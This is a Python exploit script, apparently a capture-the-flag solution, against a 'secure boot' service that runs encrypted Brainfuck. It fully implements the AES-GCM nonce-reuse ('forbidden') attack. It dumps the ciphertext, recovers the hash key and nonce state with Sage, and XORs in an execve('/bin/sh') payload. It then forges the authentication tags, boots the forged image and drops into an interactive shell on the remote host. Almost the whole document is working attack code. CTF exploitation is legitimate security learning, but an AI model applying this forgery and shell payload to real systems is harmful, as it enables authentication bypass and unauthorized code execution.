#!/usr/bin/env python2
import struct
import ast
import codecs
from pwn import *

__NR_execve = 59

payload_ptxt = ''
payload_ptxt += '>>,>++++++++' # setup read args
# | __NR_read (0) | stdin (0) | &cell2 | [length (8)]
payload_ptxt += '<<<.' # call read, so we can get input without encoding arithmetic in BF
# | [read's return (8)] | stdin (0) | "/bin/sh\0" | 8
payload_ptxt += '>>>' + '+' * (__NR_execve - 8)
# | 8 | 0 | "/bin/sh\0" | [__NR_execve]
payload_ptxt += '>,' + '-'*8*2
# | 8 | 0 | "/bin/sh\0" | __NR_execve | [ &"/bin/sh\0" ]
payload_ptxt += '<.' # execve(&"/bin/sh\0", 0, 0)

print('payload: %r' % (payload_ptxt,))

p = process('../handout/sbfos') if '--live' not in sys.argv else remote('sbfos.hackthe.vote', 51889)
#p = process(['strace', '-f', '-etrace=execve', '../handout/sbfos'])

p.recvuntil('secure-boot$')
p.sendline('dump')

contains_dump = p.recvuntil('secure-boot$')

hexdump = re.findall(b'[0-9a-f]*', contains_dump[:-len('secure-boot$')])
raw_ctxt = codecs.decode(b''.join(hexdump), 'hex')

print('%d %r' % (len(raw_ctxt), repr(raw_ctxt)))

# High-level solution sketch: compute GCM key from nonce reuse in raw_ctxt, xor with known_ptxt and payload_ptxt, then fix up the tags

# Split the ciphertext into separate streams of ciphertext and tag chunks for easier processing
ctxts = []
tags = []
i = 0
while i < len(raw_ctxt):
    ctxts.append(raw_ctxt[i:i+512])
    i += 512
    tags.append(raw_ctxt[i:i+16])
    i += 16

#print('ctxts: %r' % (ctxts,))
print('tags: %r' % (tags,))

def u128be(x):
    'Unpack Z_128 big-endian'
    a, b = struct.unpack(">QQ", x)
    return a << 64 | b

def p128be(x):
    'Pack Z_128 big-endian'
    mask = (1 << 64) - 1
    a, b = x & mask, (x >> 64) & mask
    return struct.pack(">QQ", b, a)

# chunks(xs, n) computes length-n non-overlapping chunks of xs
chunks = lambda xs, n: [xs[i*n:(i+1)*n] for i in range(len(xs) // n)]

def ctxt_to_coeffs(ctxt, tag):
    'Construct coefficients for the polynomial C[i]*x**(n-i+1) + Lx + T for the forbidden attack on GCM'
    return [u128be(a) for a in chunks(ctxt, 16)] + [len(ctxt)*8, u128be(tag)]

# Construct polynomials from the partial prefixes of the ciphertext and the tags: these are equivalent to nonce reuse
coeffs = []
for i in range(0, 8):
    cumulative_ctxt = b''.join(ctxts[j] for j in range(i+1))
    print('len cumulative[%d]: %d' % (i, len(cumulative_ctxt)))
    coeffs.append(ctxt_to_coeffs(cumulative_ctxt, tags[i]))

# This hello world program can be obtained from the binary if reversing, or as part of the handout if solving as a crypto challenge
known_ptxt = '/* 0 7103816 */++++++++>++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 1 2912108 */<++++++++++++++++++++++++++++++++++++++++++++>++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 2 7304992 */<++++++++++++++++++++++++++++++++>++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 3 6581362 */<++++++++++++++++++++++++++++++++++++++++++++++++++>++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 4 2593 */<+++++++++++++++++++++++++++++++++>+++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<,---------------------------------------->+++>,------------------------------------------------>+++>,-------------------------------------------------------->+++>,---------------------------------------------------------------->+++>,------------------------------------------------------------------------>+++>++++++++++++++++++++>+>,------------------------------------------------------------------------------------------------>+++++<<<.\n'

known_ptxt = known_ptxt.ljust(512*8, '\x00')

# Once authentication is broken, GCM is a stream cipher, so we can use xor to replace the "Hello world!" payload with an execve payload without knowing the AES key
modified_ctxt = [ord(c) for c in b''.join(ctxts)]

for i, x in enumerate(known_ptxt):
    modified_ctxt[i] ^= ord(x)

for i, x in enumerate(payload_ptxt):
    modified_ctxt[i] ^= ord(x)

modified_ctxt = b''.join(chr(c) for c in modified_ctxt)

# Construct polynomials with the tags zeroed out for the ciphertext we want to forge, they'll be evaluated at the hash key H and xored with the internal nonce state S once those are leaked
targets = []
for i in range(8):
    targets.append(ctxt_to_coeffs(modified_ctxt[:(i+1)*512], b'\0'*16))


# Solving the systems of polynomial equations over GF(2^128) for computing (H, S) to forge tags is done in Sage
with open('tmp.sage', 'w') as f:
    f.write('''
import itertools
F, x = GF(2**128, name='x', modulus=x**128 + x**7 + x**2 + x + 1).objgen()
R, y = PolynomialRing(F, 'y').objgen()

# Getting the following convertion functions to agree with openssl were the bulk of the debugging:

# unpoly converts Sage GF(2^128) elements into Python longs
unpoly = lambda a: int(''.join([str(a.polynomial()[i]) for i in range(128)]), 2)
# prepoly converts Python longs into Sage GF(2^128) elements
prepoly = lambda a: sum([((a >> (127-i)) & 1)*x**i for i in range(128)])
# poly converts lists of Python longs into Sage polynomials over GF(2^128)/[y]
poly = lambda xs: sum([prepoly(a)*y**(len(xs)-i-1) for (i, a) in enumerate(xs)])

# Splice in the problem-specific values as lists of integers, since those go across the parsing boundary with no issues
coeffs = {coeffs}
targets = {targets}

# Find the roots of the pairs of nonce-reuse polynomials
# NUM_POLYNOMIAL_COMBINATIONS trades off completeness for speed, 8 seems to be high enough that I haven't seen the exploit fail yet in a half-dozen runs
NUM_POLYNOMIAL_COMBINATIONS = 8
rootss = []
for f, g in list(itertools.combinations(coeffs, 2))[:NUM_POLYNOMIAL_COMBINATIONS]:
    print('.')
    h = poly(f) + poly(g)
    rootss.append(h.roots(ring=F, multiplicities=False))

# Each polynomial can have multiple roots, only one of which is the hash key H; flatten them for the search
raw_roots = []
for roots in rootss:
    for root in roots:
            raw_roots.append(root)

print('raw_roots: %r' % (['%032x' % (unpoly(a),) for a in raw_roots],))

# Once we know the hash key H, we can recover the initial nonce state S from a single equation:
# Since (CH^2 + LH + S = T) going forward (when encrypting), (CH^2 + LH + T = S) when solving (+ and - are the same in GF(2^k))
candidate_S = []
candidate_tags = []
for root in set(raw_roots):
    tags = []
    print('g1: %r' % (['%032x' % (a,) for a in coeffs[0]],))
    print('root: %032x g1(root): %032x' % (unpoly(root), (unpoly(poly(coeffs[0])(root)))))
    S = poly(coeffs[0])(root)
    S1 = poly(coeffs[1])(root)
    # We could possibly filter by S == S1 here to narrow down which root is actually H here, but we're allowed multiple decryption attempts in this challenge, so there's not much to gain
    candidate_S.append((unpoly(root), unpoly(S), unpoly(S1)))
    for i, t in enumerate(targets):
        print('target coeffs: %r' % (['%032x' % (a,) for a in t],))
        target_poly = poly(t)
        print('t(H): %032x' % (unpoly(target_poly(root)),))
        tag = target_poly(root) + S
        print('tag: %032x' % (unpoly(tag),))
        tags.append(unpoly(tag))
    if any(tags):
        print('candidate tag: %r' % (['%032x' % (a,) for a in tags],))
        candidate_tags.append(tuple(tags))
    print('-'*5)

print((list(set(candidate_tags)), list(set(candidate_S))))
'''.format(**locals()))

# Run sage in a subprocess, so it doesn't interfere with pwntools
q = process(['sage', 'tmp.sage'])
sage_output = q.recvall()
print(codecs.decode(sage_output, 'utf8'))

# Parse the forged tags from the last line of the sage subprocess's output. If sage errors, there'll be a parse error here
candidate_tags, candidate_Ss = ast.literal_eval(sage_output.strip().split(b'\n')[-1])
print('candidate_tags: %r' % (candidate_tags,))

for (H, S, S1) in candidate_Ss:
    print('(H, S, S1): %032x %032x %032x' % (H, S, S1))

print('original tags: %r' % (tags,))

# At least one of the sets of tags we forged with sage should work, try them all in a loop
for i, ctags in enumerate(candidate_tags):
    print('candidate %d' % (i,))
    forged_tags = []
    for j, tag in enumerate(ctags):
        print('\t%r' % (p128be(tag),))
        forged_tags.append(p128be(tag))

    # Reconstruct the payload, interleaving the ciphertexts and tags
    forged_ctxt = ''.join(modified_ctxt[i*512:(i+1)*512]+forged_tags[i] for i in range(8))

    p.sendline('load')

    p.recvregex('Enter ciphertext as hexpairs \\(.... raw bytes\\):')
    p.sendline(codecs.encode(forged_ctxt, 'hex'))

    load_response = p.recvuntil('secure-boot$')
    print(load_response)

    if 'Decryption failed' not in load_response:
        print('Candidate %d succeeded!' % (i,))
        p.sendline('boot')
        p.sendline('/bin/sh\0')

        # Interactive shell for catting the flag
        p.interactive()
        break
